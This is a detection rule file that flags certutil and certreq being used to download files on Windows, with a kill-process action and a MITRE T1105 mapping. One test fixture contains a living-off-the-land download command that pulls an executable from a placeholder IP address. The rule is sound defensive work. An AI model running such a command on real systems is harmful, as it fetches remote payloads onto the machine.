[rule]
id = "etap-001"
name = "Ingress Transfer via Windows Utility"
description = "Detects use of certutil or certreq to download files from the internet, a common living-off-the-land technique."
version = "1"
author = "E-TAP team"
license = "MIT"
os_list = ["windows"]
query = '''process where
  (process.name : "certutil.exe" and process.command_line : ("-urlcache", "-split", "-f"))
  or (process.name : "certreq.exe" and process.command_line : "-Post")
'''

[[actions]]
action = "kill_process"

[[threat]]
tactic.name = "Command and Control"
[[threat.technique]]
id = "T1105"
name = "Ingress Tool Transfer"

[[tests]]
name = "certutil download"
expect = "match"
event = { _category = "process", event = { action = "start" }, process = { name = "certutil.exe", executable = "C:\\Windows\\System32\\certutil.exe", command_line = "certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe" } }

[[tests]]
name = "hash a file"
expect = "no_match"
event = { _category = "process", event = { action = "start" }, process = { name = "certutil.exe", executable = "C:\\Windows\\System32\\certutil.exe", command_line = "certutil.exe -hashfile x.exe sha256" } }
